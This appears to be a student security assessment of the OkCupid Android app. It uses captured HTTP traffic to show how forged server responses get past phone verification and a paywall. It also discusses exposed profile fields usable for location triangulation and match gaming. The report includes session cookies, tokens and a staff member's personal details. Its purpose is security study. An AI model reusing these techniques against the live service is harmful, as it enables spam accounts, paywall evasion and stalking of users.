---
title: "Mobile Security: OKCupid report"
url: ../okcupid/"
summary: Analysis of OKCupid
tags:
    - Mobile Security
    - Assignment 2
    - OKCupid
---

## Description
OK Cupid is also a very popular dating app. It has the typical matches, where you can like or dislike suggested users. But also tabs where the app suggests you users with the most "match percentages", recommendations, users who like you and "Cupid's picks". But like all dating apps, a lot of functions are behind a paywall: daily like cap, the users who like you are made unrecognizable by the app until you pay, popularity boost if premium user.

Source: https://en.wikipedia.org/wiki/OkCupid

**Device used:** Android emulator Pixel 4 Android 9 API level 28, x86

## Structure of report
1. Description
2. Registration process
3. Login process
6. Direct profile access and obtaining other users data
9. Liking Process
10. Tracking
11. Conclusion
12. Future work

## Registration process
This app requires for a full registration a phone number. But we discovered that the app doesn't really check if the number is valid. It tries to send a verification code to the entered number. After that, the user needs to enter the code and if valid, can log in. 
However, if we enter an invalid phone number, invalid code, intercept and modify the responses to look like a valid verification, we can log in without any number. 
We can enter just any number:
```
POST /graphql/SendPhoneNumber HTTP/2
Host: okcupid.com
Cookie: override_session=0; secure_login=1; secure_check=1; guest=7499627801677657669; session=7499627801677657669%3A16707096719338247505; authlink=158b116f; _fbp=fb.1.1652979626229.695918336; nano=k%3Diframe_prefix_lock_3%2Ce%3D1653930142760%2Cv%3D1%7Ck%3Diframe_prefix_lock_2%2Ce%3D1653650365181%2Cv%3D1%7Ck%3Diframe_prefix_lock_1%2Ce%3D1652979653689%2Cv%3D1%7Ck%3Diframe_prefix_lock_-1%2Ce%3D1653930218437%2Cv%3D1
Accept: application/json
X-Apollo-Operation-Id: e8d883f7395f6212398be1a07497ce5f9d72bf05ffda5f90bf523214fb5e6065
X-Apollo-Operation-Name: SendPhoneNumber
X-Okcupid-Device-Id: Android; AOSP on IA Emulator; 9; PSR1.180720.117; Unavailable; fwciLTsdTECsUopudsdVN0;
X-Okcupid-App: OkCupid Android App 64.1.0
X-Okcupid-Platform: Android
X-Okcupid-Version: 64.1.0
X-Okcupid-Locale: en
X-Okcupid-Emulator: true
User-Agent: Android 64.1.0
X-Emb-Path: /graphql/SendPhoneNumber
Content-Type: application/json; charset=utf-8
Content-Length: 442
Accept-Encoding: gzip, deflate

{
    "operationName":"SendPhoneNumber",
    "variables":{
        "input":{
            "tspAccessToken":"eyJhbGciOiJIUzI1NiJ9.eyJpZCI6Ijc2Njg0NTc3MyIsImV4cCI6MTY1NDMzNjEwMSwidW5pcXVlbmVzc19pZCI6IkdIR01qY1NRc05SeCJ9.qe-khFh1iLNxKyeaP_lumP0lER2ro8FEN6_Pn28-G1w",
            "phoneNumber":"+4386637206742",
            "platform":"android",
            "smsFlow":"PHONE_NUMBER_LINKING"
        }
    },
    "query":"mutation SendPhoneNumber($input:AuthOTPSendInput!) { authOTPSend(input: $input) { __typename success statusCode } }"
}
```
And get following response, where we need to set success to true and statuscode to 0.
```
HTTP/2 200 OK
Date: Sat, 04 Jun 2022 09:24:32 GMT
Content-Type: application/json; charset=utf-8
X-Powered-By: Express
Vary: Origin, Accept-Encoding
Vary: Accept-Encoding
Access-Control-Allow-Credentials: true
Etag: W/"6c-aYySrsNvT+jV1x6eiVIsKYgWWMU"
Cf-Cache-Status: DYNAMIC
Expect-Ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Server: cloudflare
Cf-Ray: 715f9db0f88038c0-VIE

{
    "data":{
        "authOTPSend":{
            "__typename":"AuthOTPSendPayload",
            "success":true,
            "statusCode":0
        }
    },
    "extensions":{
    }
}
```
Now we are able to enter the verification code, where the app sends the code via a request.
```
POST /graphql/SendVerificationCode HTTP/2
Host: okcupid.com
Cookie: override_session=0; secure_login=1; secure_check=1; guest=7499627801677657669; session=7499627801677657669%3A16707096719338247505; authlink=158b116f; _fbp=fb.1.1652979626229.695918336; nano=k%3Diframe_prefix_lock_3%2Ce%3D1653930142760%2Cv%3D1%7Ck%3Diframe_prefix_lock_2%2Ce%3D1653650365181%2Cv%3D1%7Ck%3Diframe_prefix_lock_1%2Ce%3D1652979653689%2Cv%3D1%7Ck%3Diframe_prefix_lock_-1%2Ce%3D1653930218437%2Cv%3D1
Accept: application/json
X-Apollo-Operation-Id: b83a704ae9c70899f8363708cff63a3fd2ee8fe6e1472ae1dadfaf822719914f
X-Apollo-Operation-Name: SendVerificationCode
X-Okcupid-Device-Id: Android; AOSP on IA Emulator; 9; PSR1.180720.117; Unavailable; fwciLTsdTECsUopudsdVN0;
X-Okcupid-App: OkCupid Android App 64.1.0
X-Okcupid-Platform: Android
X-Okcupid-Version: 64.1.0
X-Okcupid-Locale: en
X-Okcupid-Emulator: true
User-Agent: Android 64.1.0
X-Emb-Path: /graphql/SendVerificationCode
Content-Type: application/json; charset=utf-8
Content-Length: 439
Accept-Encoding: gzip, deflate

{
    "operationName":"SendVerificationCode",
    "variables":{
        "input":{
            "tspAccessToken":"eyJhbGciOiJIUzI1NiJ9.eyJpZCI6Ijc2Njg0NTc3MyIsImV4cCI6MTY1NDMzNjU5OSwidW5pcXVlbmVzc19pZCI6Ik9aTkVUR0VqQTR3biJ9.lBdwohptxBNDtiwMOEMITHIKZzx_p7knj3KeIAXi3Sk",
            "phoneNumber":"+4386637206742",
            "otp":"111111"
        }
    },
    "query":"mutation SendVerificationCode($input:AuthTSPRefreshTokenCreateInput!) { authTSPRefreshTokenCreate(input: $input) { __typename tspRefreshToken } }"
}
```
The response we get shows that the code entered was invalid.
```
HTTP/2 200 OK
Date: Sat, 04 Jun 2022 09:32:25 GMT
Content-Type: application/json; charset=utf-8
X-Powered-By: Express
Vary: Origin, Accept-Encoding
Vary: Accept-Encoding
Access-Control-Allow-Credentials: true
Etag: W/"20b-apZNTJoeVwK6QYZENYGytWrrtD8"
Cf-Cache-Status: DYNAMIC
Expect-Ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Server: cloudflare
Cf-Ray: 715fa9411de6cbc8-VIE

{
    "errors":[
        {
            "message":"16 UNAUTHENTICATED: Tinder Status Code 992401 Invalid OTP attempt",
            "locations":[
                {
                    "line":1,
                    "column":73
                }
            ],
            "path":[
                "authTSPRefreshTokenCreate"
            ],
            "extensions":{
                "code":16,
                "exception":{
                    "stacktrace":[
                        "Error: 16 UNAUTHENTICATED: Tinder Status Code 992401 Invalid OTP attempt",
                        " at /usr/src/app/dist/auth/dataSources/sms.js:105:13",
                        " at runMicrotasks (<anonymous>)",
                        " at processTicksAndRejections (internal/process/task_queues.js:95:5)"
                    ]
                }
            }
        }
    ],
    "data":{
        "authTSPRefreshTokenCreate":null
    },
    "extensions":{
    }
}

```
So we need to change the response, that it looks like the verification was successful. Changing it to following response should do the job:
```
HTTP/2 200 OK
Date: Sat, 04 Jun 2022 09:28:42 GMT
Content-Type: application/json; charset=utf-8
X-Powered-By: Express
Vary: Origin, Accept-Encoding
Vary: Accept-Encoding
Access-Control-Allow-Credentials: true
Etag: W/"20b-apZNTJoeVwK6QYZENYGytWrrtD8"
Cf-Cache-Status: DYNAMIC
Expect-Ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Server: cloudflare
Cf-Ray: 715fa3ce6f8f38b0-VIE

{
    "errors":[
        {
            "message":"0 AUTHENTICATED",
            "locations":[
                {
                    "line":1,
                    "column":73
                }
            ],
            "path":[
                "authTSPRefreshTokenCreate"
            ],
            "extensions":{
            }
        }
    ],
    "data":{
        "authTSPRefreshTokenCreate":null
    },
    "extensions":{
    }
}
```
Now the app wants to update the phone number and checks, if it was successful
```
POST /graphql/UpdatePhoneNumber HTTP/2
Host: okcupid.com
Cookie: override_session=0; secure_login=1; secure_check=1; guest=7499627801677657669; session=7499627801677657669%3A16707096719338247505; authlink=158b116f; _fbp=fb.1.1652979626229.695918336; nano=k%3Diframe_prefix_lock_3%2Ce%3D1653930142760%2Cv%3D1%7Ck%3Diframe_prefix_lock_2%2Ce%3D1653650365181%2Cv%3D1%7Ck%3Diframe_prefix_lock_1%2Ce%3D1652979653689%2Cv%3D1%7Ck%3Diframe_prefix_lock_-1%2Ce%3D1653930218437%2Cv%3D1
Accept: application/json
X-Apollo-Operation-Id: 706c24c6f60c764605db4e932c1ccdc80020cc928b1111bcc0a14531d265811e
X-Apollo-Operation-Name: UpdatePhoneNumber
X-Okcupid-Device-Id: Android; AOSP on IA Emulator; 9; PSR1.180720.117; Unavailable; fwciLTsdTECsUopudsdVN0;
X-Okcupid-App: OkCupid Android App 64.1.0
X-Okcupid-Platform: Android
X-Okcupid-Version: 64.1.0
X-Okcupid-Locale: en
X-Okcupid-Emulator: true
User-Agent: Android 64.1.0
X-Emb-Path: /graphql/UpdatePhoneNumber
Content-Type: application/json; charset=utf-8
Content-Length: 230
Accept-Encoding: gzip, deflate

{
    "operationName":"UpdatePhoneNumber",
    "variables":{
        "input":{
            "tspRefreshToken":""
        }
    },
    "query":"mutation UpdatePhoneNumber($input:UserUpdatePhoneNumberInput!) { userUpdatePhoneNumber(input: $input) { __typename success statusCode } }"
}
```
We need to change the response to this request by setting "success" to true and the statuscode to 0.
```
HTTP/2 200 OK
Date: Sat, 04 Jun 2022 09:43:55 GMT
Content-Type: application/json; charset=utf-8
X-Powered-By: Express
Vary: Origin, Accept-Encoding
Vary: Accept-Encoding
Access-Control-Allow-Credentials: true
Etag: W/"81-hrlnHKfISioHEIcL0gOlcbam6Zg"
Cf-Cache-Status: DYNAMIC
Expect-Ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Server: cloudflare
Cf-Ray: 715fba185fb577fb-VIE

{
    "data":{
        "userUpdatePhoneNumber":{
            "__typename":"UserUpdatePhoneNumberResponse",
            "success":true,
            "statusCode":0
        }
    },
    "extensions":{
    }
}
```
Forwarding this modified response logs us in without a valid phone number. This whole process needs to be done quickly because otherwise, it shows a time-out error message.
Besides that, this needs to be done every time we restart the app because it's only valid on the client side and no number is saved in the account.
With automation of this process, a lot of spam accounts could be made. Additionally, the app also doesn't care about real email addresses.

## Direct profile access and obtaining other users data
At first, we wanted to investigate the data of users the app gives us. Luckily after first login, a staff sent us a "welcome" message. After clicking on the profile, the app sends a few requests like:
```
GET /1/profile/4170169657126759250 HTTP/2
Host: api.okcupid.com
Cookie: override_session=0; secure_login=1; secure_check=1; guest=7499627801677657669; session=7499627801677657669%3A16707096719338247505; authlink=158b116f; _fbp=fb.1.1652979626229.695918336; siftsession=710935292553977095; nano=k%3Diframe_prefix_lock_-1%2Ce%3D1653930218437%2Cv%3D1%7Ck%3Diframe_prefix_lock_3%2Ce%3D1653930142760%2Cv%3D1%7Ck%3Diframe_prefix_lock_2%2Ce%3D1653650365181%2Cv%3D1%7Ck%3Diframe_prefix_lock_1%2Ce%3D1652979653689%2Cv%3D1%7Ck%3Diframe_prefix_lock_4%2Ce%3D1654341185691%2Cv%3D1
Endpoint_version: 1
X-Okcupid-Device-Id: Android; AOSP on IA Emulator; 9; PSR1.180720.117; Unavailable; fwciLTsdTECsUopudsdVN0;
X-Okcupid-App: OkCupid Android App 64.1.0
X-Okcupid-Platform: Android
X-Okcupid-Version: 64.1.0
X-Okcupid-Locale: en
X-Okcupid-Emulator: true
User-Agent: Android 64.1.0
Accept-Encoding: gzip, deflate
```
Also to this endpoints:
```
GET /1/profile/4170169657126759250/fields?fields=userinfo%2Cphotos.limit%281%29%2Clikes%2Cpercentages
```
```
GET /1/profile/4170169657126759250/answer_filters 
```
```
GET /1/profile/4170169657126759250/answers?filter=9&after=&limit=60&sort=0 HTTP/2
```
These are to load the user data and present it on the user chart.
But it also sends a request with my user id:
```
GET /1/profile/7499627801677657669/fields?fields=userinfo%2Cphotos.limit%281%29%2Clikes%2Cpercentages HTTP/2
```
The response to this give a lot of my information:
```=json
{
    "userinfo":{
        "realname":"OhBoy",
        "gender_letter":"M",
        "gender":"Man",
        "age":22,
        "join_date":1652957903,
        "email_address":"oh.boy@gmail.com",
        "rel_status":"Single",
        "location":"Graz",
        "orientation":"Straight",
        "displayname":"OhBoy",
        "staff_badge":null
    },
    "photos":[
        {
            "full":"https://cdn.okccdn.com/php/load_okc_image.php/images/150x150/558x800/52x197/152x297/0/4918138661936607854.webp?v=3",
            "original":"https://cdn.okccdn.com/php/load_okc_image.php/images/52x197/152x297/0/4918138661936607854.webp?v=3",
            "info":{
                "full":{
                    "thumbnail":{
                        "height":100,
                        "y":197,
                        "x":52,
                        "width":100
                    },
                    "size":{
                        "height":481,
                        "y":0,
                        "x":0,
                        "width":365
                    },
                    "center":{
                        "y":247,
                        "x":102,
                        "y_percent":51,
                        "x_percent":27
                    }
                },
                "caption":"",
                "id":"4918138661936607854",
                "original":{
                    "size":{
                        "width":365,
                        "height":481
                    },
                    "thumbnail":{
                        "height":100,
                        "y":197,
                        "x":52,
                        "width":100
                    }
                }
            },
            "full_small":"https://cdn.okccdn.com/php/load_okc_image.php/images/150x150/279x400/52x197/152x297/0/4918138661936607854.webp?v=3"
        }
    ],
    "likes":{
        "via_superboost":null,
        "mutual_like_vote":0,
        "recycled":0,
        "they_superlike":null,
        "passed_on":0,
        "they_like":null,
        "you_superlike":0,
        "you_like":null,
        "via_spotlight":null,
        "mutual_like":0,
        "vote":{
        }
    },
    "percentages":{
        "match":96,
        "enemy":99
    },
    "inactive":false,
    "userid":"7499627801677657669",
    "staff":false,
    "username":"7499627801677657669",
    "isAdmin":false
}
```
The staff and isAdmin tag was interesting at first sight. I tried to alter it in some other requests and responses, but nothing interesting happened. 

However, investigating the response to the first request to load the staff profile showed some interesting data. It is a lot of JSON data with a lot of tags. The tag "staff" obviously is true, but also isAdmin is set to true on this profile. While reading through the data and comparing it with the profile chart on the app, we found a tag with data that was not visible on the app. Besides the location (New York), which is also visible, there are tags "neighborhood" and "home_neighbourhood" which are set to "Chelsea" on this profile. The tag "distance" shows the distance between both users. With more accounts and the actual distance of these that could be exploited to triangulate the target users' exact location!
There is also hidden information that could help scammers or people with bad intentions. Alice is her username for some reason. If you look at my JSON data, my username is my user id.
```=json
    "nudge":{
        "text":"Alice is looking for people near Manhattan, NY",
        "type":"wiw",
        "id":"distance",
        "negative":true,
        "hidden":true
    }
```

The app uses staticly linked photos like 
```
https://cdn.okccdn.com/php/load_okc_image.php/images/0x375/1125x1500/0/10209088093963045520.jpeg
```
where the user id is 10209088093963045520.

The whole JSON data looks like this:
```=json
{
    "user":{
        "connection_compatibilities":[
        ],
        "inactive":false,
        "likes":{
            "via_superboost":null,
            "mutual_like_vote":0,
            "recycled":0,
            "they_superlike":null,
            "passed_on":0,
            "they_like":null,
            "you_superlike":0,
            "you_like":null,
            "via_spotlight":null,
            "mutual_like":0,
            "vote":{
            }
        },
        "details":[
            {
                "text":{
                    "text":"Straight, Woman, Cis Woman, Single, Monogamous",
                    "text_color":{
                        "blue":53,
                        "green":47,
                        "red":42,
                        "alpha":1
                    }
                },
                "info":{
                    "name":"basics"
                },
                "icon":{
                    "icon_color":null,
                    "url":"https://cdn.okccdn.com/media/img/icons/details_basics.png"
                }
            },
            {
                "text":{
                    "text":"Uses she/her pronouns",
                    "text_color":{
                        "blue":53,
                        "green":47,
                        "red":42,
                        "alpha":1
                    }
                },
                "info":{
                    "name":"pronouns"
                },
                "icon":{
                    "icon_color":null,
                    "url":"https://cdn.okccdn.com/media/img/icons/details_pronouns.png"
                }
            },
            {
                "text":{
                    "text":"5\u2019 10\u201d, Average build",
                    "text_color":{
                        "blue":53,
                        "green":47,
                        "red":42,
                        "alpha":1
                    }
                },
                "info":{
                    "name":"looks"
                },
                "icon":{
                    "icon_color":null,
                    "url":"https://cdn.okccdn.com/media/img/icons/details_looks.png"
                }
            },
            {
                "text":{
                    "text":"White, Speaks English",
                    "text_color":{
                        "blue":53,
                        "green":47,
                        "red":42,
                        "alpha":1
                    }
                },
                "info":{
                    "name":"background"
                },
                "icon":{
                    "icon_color":null,
                    "url":"https://cdn.okccdn.com/media/img/icons/details_background.png"
                }
            },
            {
                "text":{
                    "text":"Doesn't smoke cigarettes, Drinks sometimes, Omnivore",
                    "text_color":{
                        "blue":53,
                        "green":47,
                        "red":42,
                        "alpha":1
                    }
                },
                "info":{
                    "name":"lifestyle"
                },
                "icon":{
                    "icon_color":null,
                    "url":"https://cdn.okccdn.com/media/img/icons/details_lifestyle.png"
                }
            },
            {
                "text":{
                    "text":"Has cat(s), Has dog(s)",
                    "text_color":{
                        "blue":53,
                        "green":47,
                        "red":42,
                        "alpha":1
                    }
                },
                "info":{
                    "name":"family"
                },
                "icon":{
                    "icon_color":null,
                    "url":"https://cdn.okccdn.com/media/img/icons/details_family.png"
                }
            }
        ],
        "last_login":1653922874,
        "essays":[],
        "bookmarked":false,
        "location":{
            "country_code":"US",
            "formatted":{
                "distance_unit":"mi",
                "short":"Manhattan, US",
                "standard":"Manhattan, United States",
                "home_neighborhood":"Chelsea",
                "distance":4228.04917,
                "neighborhood":"Chelsea"
            },
            "state_code":"NY",
            "locid":4335338
        },
        "userid":"4170169657126759250",
        "staff":true,
        "isAdmin":true,
        "photos":[],
        "match_genres":{
            "sex":{
                "insufficient":true,
                "you_answered":0,
                "they_answered":0,
                "match":50,
                "mutual_answered":0,
                "label":"Intimacy",
                "rel":"/profile/Alice/questions?Sex=1",
                "enemy":0
            },
            "religion":{
                "insufficient":true,
                "you_answered":2,
                "they_answered":0,
                "match":50,
                "mutual_answered":0,
                "label":"Religion",
                "rel":"/profile/Alice/questions?Religion=1",
                "enemy":0
            },
            "ethics":{
                "insufficient":true,
                "you_answered":0,
                "they_answered":1,
                "match":50,
                "mutual_answered":0,
                "label":"Ethics",
                "rel":"/profile/Alice/questions?Ethics=1",
                "enemy":0
            },
            "other":{
                "insufficient":true,
                "you_answered":5,
                "they_answered":1,
                "match":50,
                "mutual_answered":0,
                "label":"Other",
                "rel":"/profile/Alice/questions?Other=1",
                "enemy":0
            },
            "lifestyle":{
                "insufficient":true,
                "you_answered":5,
                "they_answered":0,
                "match":50,
                "mutual_answered":0,
                "label":"Lifestyle",
                "rel":"/profile/Alice/questions?Lifestyle=1",
                "enemy":0
            },
            "dating":{
                "insufficient":true,
                "you_answered":3,
                "they_answered":0,
                "match":50,
                "mutual_answered":0,
                "label":"Dating",
                "rel":"/profile/Alice/questions?Dating=1",
                "enemy":0
            }
        },
        "last_contacts":{
            "forward":0,
            "reverse":0
        },
        "online":false,
        "userinfo":{
            "realname":"Sarah",
            "gender_letter":"F",
            "gender":"Woman",
            "age":38,
            "join_date":1296597315,
            "rel_status":"Single",
            "location":"Manhattan, United States",
            "orientation":"Straight",
            "staff_badge":"OkStaff",
            "displayname":"Sarah"
        },
        "linked_account":null,
        "username":"Alice",
        "first_message":null,
        "hidden":false,
        "nudge":{
            "text":"Alice is looking for people near Manhattan, NY",
            "type":"wiw",
            "id":"distance",
            "negative":true,
            "hidden":true
        },
        "blocked":false,
        "percentages":{
            "match":100,
            "enemy":0
        }
    },
    "extras":{
        "shadowbox":{
            "likesCap":{
                "name":"likesCapAlist",
                "title":"You\u2019ve sent the max daily likes",
                "actions":[
                    {
                        "target_url":"/upgrade?clear_history=1&cf=likescappaywall",
                        "text":"GET A-LIST"
                    },
                    {
                        "cancel":1,
                        "text":"Cancel",
                        "action":"cancel"
                    }
                ],
                "desc":"Send unlimited likes & find more matches with A-List",
                "icon":"likesCapError",
                "icon_src":"http://cdn.okccdn.com/media/img/mobile_app/illustrations/morelikes.png"
            }
        },
        "hasHeader":true,
        "hasAds":true,
        "draft":null,
        "promo":{
            "feature":"browse",
            "text":"<strong>Browse invisibly</strong>"
        },
        "isVisibleThroughIncognito":false,
        "userInstructions":{},
        "questionPlaceholder":{
            "cta":"Answer",
            "text":"You haven\u2019t answered enough of the same questions.",
            "rel":"/profile/Alice/questions?unanswered=1",
            "strong":"Not enough data",
            "icon":"lock-closed"
        },
        "selfView":false,
        "hasIncognito":false,
        "userGuides":{},
        "isBoosting":false,
        "hasProfilePassing":true,
        "numQuestions":15,
        "isIncognito":false,
        "boostTokenCount":0,
        "canBribe":false,
        "reduxParams":{
            "profile":{
                "percentages":{
                    "match":100,
                    "enemy":0
                },
                "details":[],
                "likes":{
                    "via_superboost":null,
                    "mutual_like_vote":0,
                    "recycled":0,
                    "they_superlike":null,
                    "passed_on":0,
                    "they_like":null,
                    "you_superlike":0,
                    "you_like":null,
                    "via_spotlight":null,
                    "mutual_like":0,
                    "vote":{
                    }
                },
                "bookmarked":false,
                "isVisibleThroughIncognito":false,
                "userInstructions":{},
                "photos":[],
                "viewerUnderstandsOcsLike":true,
                "online":false,
                "currentUserThumb":"https://cdn.okccdn.com/php/load_okc_image.php/images/160x160/160x160/52x197/152x297/2/4918138661936607854.webp?v=3",
                "likesCapRateCardViewCount":0,
                "isBoosting":false,
                "userinfo":{
                    "realname":"Sarah",
                    "gender_letter":"F",
                    "gender":"Woman",
                    "age":38,
                    "join_date":1296597315,
                    "rel_status":"Single",
                    "location":"Manhattan, United States",
                    "orientation":"Straight",
                    "staff_badge":"OkStaff",
                    "displayname":"Sarah"
                },
                "numQuestions":15,
                "location":{
                    "country_code":"US",
                    "formatted":{
                        "distance_unit":"mi",
                        "short":"Manhattan, US",
                        "standard":"Manhattan, United States",
                        "home_neighborhood":"Chelsea",
                        "distance":4228.04917,
                        "neighborhood":"Chelsea"
                    },
                    "state_code":"NY",
                    "locid":4335338
                },
                "isIncognito":false,
                "isLoggedIn":true,
                "boostTokenCount":0,
                "userid":"4170169657126759250",
                "displayname":"Sarah",
                "showNoPhotosBlock":false,
                "hasInstagram":false,
                "viewerUnderstandsOcsPass":true,
                "isSelfView":false,
                "linkedAccount":null,
                "likesCapResetTime":1654394400,
                "nudge":{
                    "text":"Alice is looking for people near Manhattan, NY",
                    "type":"wiw",
                    "id":"distance",
                    "negative":true,
                    "hidden":true
                },
                "essays":[],
                "mobileMessageLink":"/messages?compose=1&userid=4170169657126759250",
                "staffBadge":"OkStaff",
                "blocked":false,
                "username":"Alice",
                "age":38,
                "firstMessage":null
            }
        },
        "hasInstagram":false,
        "lastThreadId":null,
        "canVisit":false,
        "hasLikesRemaining":true,
        "current_user_has_seen_likes_cap":false,
        "notice":{
            "display":{
            },
            "state":null
        },
        "activeAlbumCount":1,
        "shareURL":"/1/apitun/profile/Alice/share",
        "icebreakers":{
            "geo":{
                "neighborhood":"Chelsea",
                "type":"geo"
            }
        },
        "matchAnalysis":{
            "match_pct":50,
            "text":"They need to answer more questions.",
            "id":"insufficient_them",
            "enemy_pct":0,
            "accurate":false,
            "title":"Not enough info"
        },
        "morePhotos":[
        ],
        "isBrowsingAnon":false,
        "hasAgeBlock":false,
        "staffBadge":"OkStaff",
        "blocked":false,
        "canBigMailbox":false,
        "morePhotosAlbumId":"14300816382384942176",
        "lastContact":0,
        "canMessage":false,
        "genreOrder":[
            "sex",
            "religion",
            "ethics",
            "other",
            "lifestyle",
            "dating"
        ],
        "reportingIntro":{
            "blocking":{
                "userGuide":"",
                "shadowbox":{},
                "understands":false
            }
        },
        "profileCommenting":{
            "userGuide":"profile_commenting_photo",
            "understands":true
        },
        "lastOnlineString":"Last online Monday - 5:01pm",
        "showPhotoMessageBlock":false
    }
}
```
More tags are "isOnline", "lastContact", "lastOnlineString" that shows last time online e.g. "Last online Wednesday - 12:11am", "isLoggedIn" and hasInstagram. There is also a section where you can see the "match_genres" what the user answered and what the match value is.

Looking at the match analysis in this data we can see in advance, what the app "thinks" about the match without interacting with the user. 

```=json
    "matchAnalysis":{
        "disposition":"negative",
        "enemy_pct":60,
        "match_pct":78,
        "id":"high_enemy",
        "title":"Y\u2019all got issues",
        "accurate":true,
        "text":"Compatibility looks hazy."
    }
```
This information could be used to change the profile in a way, to match the target user and get a perfect match.

Looking further into the location part shows that the neighborhood tag is not automatically set. Maybe it's an option when living in a big city. But it shows still the distance and also the distance unit
```=json
"location":{
    "country_code":"AU",
    "formatted":{
        "distance_unit":"mi",
        "short":"Lassnitzh\u00f6he",
        "standard":"Lassnitzh\u00f6he",
        "neighborhood":null,
        "distance":6.281863434
    },
```

## Investigating premium functions

The app offers a tab where the user can see who likes them. As usual, this is behind a pay wall. But here we can also modify the response, when data is loaded in with a request, to remove the locking function.
First the app sends a request to 
```
POST /graphql/SeeWhoLikesYouFeatureStatus HTTP/2
```
Changing the values of "isActive" and "wasEverActive" the response to true, removes the scrolling lock. Sadly the profile are still defaced and still behind a paywall. 
```
{
    "data":{
        "me":{
            "__typename":"User",
            "featureSubscription":{
                "__typename":"FeatureSubscription",
                "id":"SEE_WHO_LIKES_YOU",
                "isActive":true,
                "wasEverActive":true,
                "timeOfMarkedLoss":null,
                "timeOfActualLoss":null
            }
        }
    },
    "extensions":{
    }
}
```

## Liking process
Using the discover tab (where users are able to like/dislike suggested users) the app first loads in a few profiles with pictures. If the user likes or dislikes the presented other user, the app doesn't instantly send a POST request to the API. It seems that the app collects the votes and sends them after a few minutes. Looking at the POST request
```
POST /1/locals/vote HTTP/2
Host: api.okcupid.com
Cookie: override_session=0; secure_login=1; secure_check=1; guest=7499627801677657669; session=7499627801677657669%3A16707096719338247505; authlink=158b116f; _fbp=fb.1.1652979626229.695918336; siftsession=710935292553977095; nano=k%3Diframe_prefix_lock_5%2Ce%3D1654344199164%2Cv%3D1%7Ck%3Diframe_prefix_lock_4%2Ce%3D1654341185691%2Cv%3D1%7Ck%3Diframe_prefix_lock_3%2Ce%3D1653930142760%2Cv%3D1%7Ck%3Diframe_prefix_lock_2%2Ce%3D1653650365181%2Cv%3D1%7Ck%3Diframe_prefix_lock_1%2Ce%3D1652979653689%2Cv%3D1%7Ck%3Diframe_prefix_lock_-1%2Ce%3D1654344250986%2Cv%3D1
Endpoint_version: 1
X-Okcupid-Device-Id: Android; AOSP on IA Emulator; 9; PSR1.180720.117; Unavailable; fwciLTsdTECsUopudsdVN0;
X-Okcupid-App: OkCupid Android App 64.1.0
X-Okcupid-Platform: Android
X-Okcupid-Version: 64.1.0
X-Okcupid-Locale: en
X-Okcupid-Emulator: true
User-Agent: Android 64.1.0
Content-Type: application/json; charset=UTF-8
Content-Length: 1742
Accept-Encoding: gzip, deflate

{
    "votes":[
        {
            "cardType":"user",
            "id":"10148139789107709024",
            "user_data":"CmaiYuuFatwY49Nv5Ci6chBljp77aOI3EtFZ28mKGhNNYe/m9oGA4anxsx2abwO9v+YT6yUY6ZVgtT2sGegwUrU7DvxuDf+vgudjxf11uiJnpK0pm3n4M8OVMXkdHVRJLhrQ424i1FcAv4n0+DM6h75HMCr/GpMusdJNNdtXV9QgBbZq2CZxfnBs3htDUDKA5H8icmnTHAX6tc2I3SKk5b2yflfgVPowZ7Qh+BSVCCSCu/ZZ5BlItm7+HM72zf3tEq3Z2BC/BZcJCR44UB+P6g==",
            "voteValue":"yes"
        },
        {
            "cardType":"user",
            "id":"17006486363134290132",
            "user_data":"YOIEjbS5lKIFSXM48SLq7pa5a/Tj0TMtL/d/fHy390VPqbDxZ23OFbkwM/qMrARsODBCWbMxNKe58w7dE2rtWzQQ5jTSGxRrzvA66y6BYCZILGtzyfcIohYoSGdcldxtr9CCVluvDllIfrcl9pF4dIr3B1DTJkXz/ScjOfHdmmgnZGYqzQGsHsYIAdo20rbQr3xVUkqg+aYr5W80VRHZ18wzGOumIhDmewxXPb3w2S0Uk4JG+uua+FBxtj+UMt2K",
            "voteValue":"yes"
        },
        {},
        {},
        {}
    ]
}
```
we can see the collected votes. Besides the voteValue the app sends encrypted user_data. At the top, we can see the user_id of my account. In the session tag, we can see that the first part is also my user_id.
Playing around and altering these values to like my account with their user_id or liking myself didn't do anything. Decrypting the user data also didn't show anything.

Liking a lot of users, i finally hit the cap. The like remaining till the cap, are saved and updated on the API.
```=json
{
    "likesRemaining":0,
    "likesCapBlankState":{
        "id":"likesCapAList",
        "title":"You\u2019ve sent the max daily likes",
        "subtitle":"Send unlimited likes & find more matches with A-List",
        "buttons":[
            {
                "intent":{
                    "url":"/upgrade?clear_history=1&cf=likescappaywall&source=doubletake"
                },
                "text":"GET A-LIST"
            }
        ],
        "icon_src":"http://cdn.okccdn.com/media/img/mobile_app/illustrations/morelikes.png"
    },
    "user":[
        {
            "via_spotlight":false,
            "status":1,
            "mutual_like":false,
            "notify_good_vote":true
        },
        {
            "via_spotlight":false,
            "status":1,
            "mutual_like":false,
            "notify_good_vote":true
        },
        {
            "via_spotlight":false,
            "status":1,
            "mutual_like":false,
            "notify_good_vote":true
        },
        {
            "via_spotlight":false,
            "status":1,
            "mutual_like":false,
            "notify_good_vote":true
        },
        {
            "via_spotlight":false,
            "status":1,
            "mutual_like":false,
            "notify_good_vote":true
        }
    ],
    "likesCapResetTime":1654394400,
    "likesCapRateCardViewCount":0,
    "shouldTrackHitLikesCap":true
}
```
That is the response from the API after liking the last user. From there liking a user doesn't do anything. The number of times to try to like is tracked and sent with a request: 
```
POST /1/rate_card/view HTTP/2
Host: api.okcupid.com
...
{"promo_id":"alist.likescappaywall"}
```
## Tracking

To log user events this app regularly sends this request with encrypted data to https://data.emb-api.com.

```
POST /v1/log/logging HTTP/1.1
```

This can track events on the app and begins to track even in the register/login process. That's how they can track user behavior.

## Conclusion
